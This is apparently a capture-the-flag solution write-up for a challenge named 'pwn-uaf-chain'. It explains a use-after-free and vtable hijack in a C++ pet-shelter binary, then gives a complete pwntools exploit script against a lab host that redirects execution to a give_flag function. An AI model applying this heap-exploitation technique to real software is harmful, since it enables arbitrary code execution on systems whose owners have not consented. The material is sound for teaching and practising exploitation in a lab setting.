# pwn-uaf-chain — Solution

## Object Layout (Dog/Cat, ~48 bytes)
```
offset 0:  vtable pointer (8 bytes)  <- what we overwrite
offset 8:  name[32]
```

## Vulnerability Chain
1. **Address leak**: `info()` prints the object address (heap).
2. **UAF**: `remove()` (option 5) calls `delete` but doesn't null `shelter[s]` — pointer still valid.
3. **Heap reclaim**: option 6 (`fill slot`) calls `malloc(48)` — same size as Dog/Cat — reclaims the freed chunk and stores our controlled data there.
4. **Vtable hijack**: when `speak()` is called on the UAF'd slot, it reads the first 8 bytes as a vtable pointer, then calls `vtable[0]` (first virtual method = `speak`).

## Exploitation

### Step 1 — Get `give_flag` address
Binary prints `[debug] give_flag=0x...` at startup.

### Step 2 — Heap layout
Since `speak()` calls `vtable[0]`, we need:
```
fake_vtable[0] = give_flag_addr    (speak)
fake_vtable[1] = give_flag_addr    (info — not needed but set anyway)
fake_vtable[2] = give_flag_addr    (destructor)
```
Store the fake vtable somewhere in the heap (use option 6 on another slot), then make the UAF'd slot's first 8 bytes point to it.

### Step 3 — Trigger
Call `speak()` on the freed slot → follows fake vtable → calls `give_flag()`.

## Exploit

```python
from pwn import *

HOST = '172.30.2.32'
PORT = 9998

def start(): return remote(HOST, PORT)

def add_dog(p, slot, name):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Slot', str(slot).encode() + b'\n')
    p.sendafter(b'Name: ', name + b'\n')

def speak(p, slot):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Slot', str(slot).encode() + b'\n')

def info(p, slot):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Slot', str(slot).encode() + b'\n')
    p.recvuntil(b'object at: ')
    return int(p.recvline().strip(), 16)

def remove(p, slot):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'Slot', str(slot).encode() + b'\n')

def fill(p, slot, data):
    p.sendlineafter(b'> ', b'6')
    p.sendlineafter(b'Slot', str(slot).encode() + b'\n')
    p.sendafter(b'Data (48 bytes): ', data.ljust(48, b'\x00'))
    p.recvuntil(b'placed at slot')
    p.recvuntil(b': ')
    return int(p.recvline().strip(), 16)

p = start()

# Get give_flag address
p.recvuntil(b'give_flag=')
give_flag = int(p.recvline().strip(), 16)
log.success(f'give_flag: {give_flag:#x}')

# Step 1: create dog at slot 0, get its heap address
add_dog(p, 0, b'Buddy')
obj_addr = info(p, 0)
log.success(f'Dog at: {obj_addr:#x}')

# Step 2: create dog at slot 1 to use as fake vtable storage
add_dog(p, 1, b'Max')
vtable_obj = info(p, 1)
log.success(f'Vtable storage at: {vtable_obj:#x}')

# Step 3: free dog at slot 0 (UAF — pointer still in shelter[0])
remove(p, 0)

# Step 4: place fake vtable in slot 1's space
# The vtable is an array of function pointers
# speak() = vtable[0], info() = vtable[1], ~Animal() = vtable[2]
fake_vtable = p64(give_flag) * 6
remove(p, 1)  # free slot 1 too
raw_addr = fill(p, 1, fake_vtable)  # reclaim slot 1 with fake vtable
log.success(f'Fake vtable at: {raw_addr:#x}')

# Step 5: reclaim slot 0's freed chunk with data pointing to our fake vtable
fill(p, 0, p64(raw_addr) + b'A' * 40)  # first 8 bytes = pointer to fake vtable

# Step 6: trigger UAF — call speak() on "freed" slot 0
# shelter[0] -> our controlled data -> vtable ptr = raw_addr -> give_flag
speak(p, 0)

p.interactive()
```

## Notes
- Heap chunk reuse requires same size class — Dog/Cat are ~48 bytes, `malloc(48)` in option 6 matches
- The vtable pointer is always the first 8 bytes of a C++ object with virtual methods
- `give_flag()` calls `system("cat /home/ctf/flag.txt")` — direct win
